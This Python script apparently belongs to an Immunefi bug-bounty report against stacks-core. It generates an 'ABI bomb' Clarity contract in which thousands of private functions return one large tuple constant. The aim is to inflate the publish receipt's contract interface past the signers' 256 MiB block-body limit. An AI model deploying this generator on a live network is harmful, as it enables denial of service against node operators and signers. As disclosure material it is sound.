#!/usr/bin/env python3
"""Generate `abi_bomb.clar` for Immunefi report 86722.

The Clarity analyzer infers each function's return type. A contract that
returns one shared tuple constant from thousands of small private
functions therefore has a `contract_interface` that serializes the same
inferred tuple type once per function. Private functions are included in
the interface stacks-core attaches to every contract-publish receipt.

Defaults: FIELDS=1000, FUNCTIONS=8200 -> ~302 KB source, ~270 MB interface
(2.1 MB over the 256 MiB signer `NEW_BLOCK_BODY_LIMIT`).
"""

import argparse
import sys

ap = argparse.ArgumentParser(description=__doc__)
ap.add_argument("--fields", type=int, default=1000,
                help="tuple keys in the shared constant (default 1000)")
ap.add_argument("--functions", type=int, default=8200,
                help="private functions that return the constant (default 8200)")
a = ap.parse_args()

tuple_body = ",".join(f"k{i}:u0" for i in range(a.fields))
funcs = "".join(f"(define-private (f{i}) (ok shared))" for i in range(a.functions))
src = f"(define-constant shared {{{tuple_body}}}){funcs}"

sys.stderr.write(
    f"[gen] fields={a.fields} functions={a.functions} "
    f"-> source={len(src)} bytes\n"
)
sys.stdout.write(src)
